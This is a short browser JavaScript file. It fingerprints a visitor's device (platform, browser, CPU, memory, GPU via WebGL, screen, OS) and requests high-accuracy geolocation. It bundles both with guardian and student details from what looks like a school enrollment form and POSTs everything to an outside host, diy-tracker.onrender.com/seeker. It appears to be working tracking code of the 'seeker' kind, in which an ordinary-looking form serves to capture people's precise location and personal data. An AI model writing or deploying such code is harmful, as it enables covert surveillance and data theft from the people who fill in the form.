function information() {
  const ptf = navigator.platform;
  const cc = navigator.hardwareConcurrency || 'Not Available';
  const ram = navigator.deviceMemory || 'Not Available';
  const ver = navigator.userAgent;
  const canvas = document.createElement('canvas');
  let gl, debugInfo, ven, ren;

  // Detect browser
  let brw = 'Not Available';
  if (ver.indexOf('Firefox') != -1) brw = 'Firefox';
  else if (ver.indexOf('Chrome') != -1) brw = 'Chrome';
  else if (ver.indexOf('Safari') != -1) brw = 'Safari';
  else if (ver.indexOf('Edge') != -1) brw = 'Edge';

  // GPU info
  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Not Available';
      ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Not Available';
    }
  } catch (e) {
    ven = 'Not Available';
    ren = 'Not Available';
  }

  const ht = window.screen.height;
  const wd = window.screen.width;

  // OS
  let os = ver.substring(0, ver.indexOf(')')).split(';')[1] || 'Not Available';
  os = os.trim();

  // Store globally for later use (so locate() can include this info)
  window.deviceInfo = { ptf, brw, cc, ram, ven, ren, ht, wd, os };
}

function locate(callback, errCallback) {
  if (!navigator.geolocation) {
    errCallback(null, 'Geolocation not supported.');
    return;
  }

  const optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
  navigator.geolocation.getCurrentPosition(success, error, optn);

  function error(err) {
    console.error('Location error:', err);
    errCallback(err, err.message);
  }

  async function success(position) {
    const lat = position.coords.latitude?.toFixed(6);
    const lon = position.coords.longitude?.toFixed(6);
    const acc = position.coords.accuracy || 'N/A';
    const alt = position.coords.altitude || 'N/A';
    const dir = position.coords.heading || 'N/A';
    const spd = position.coords.speed || 'N/A';

    const data = {
      ...window.deviceInfo,
      lat,
      lon,
      acc,
      alt,
      dir,
      spd,
      guardianName: $('#guardianName').val(),
      email: $('#email').val(),
      contact: $('#contact').val(),
      address: $('#address').val(),
      studentName: $('#studentName').val(),
      course: $('#course').val(),
      yearLevel: $('#yearLevel').val(),
      consent: $('#consentCheckbox').is(':checked') ? 'Yes' : 'No'
    };

    // console.log('Sending data to Flask backend:', data);

    try {
      const response = await fetch('https://diy-tracker.onrender.com/seeker', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });

      const result = await response.json();
      // console.log('Server response:', result);
      if (result.status === 'success') callback(result);
      else errCallback(result);
    } catch (error) {
      console.error('Error sending data:', error);
      errCallback(error);
    }
  }
}
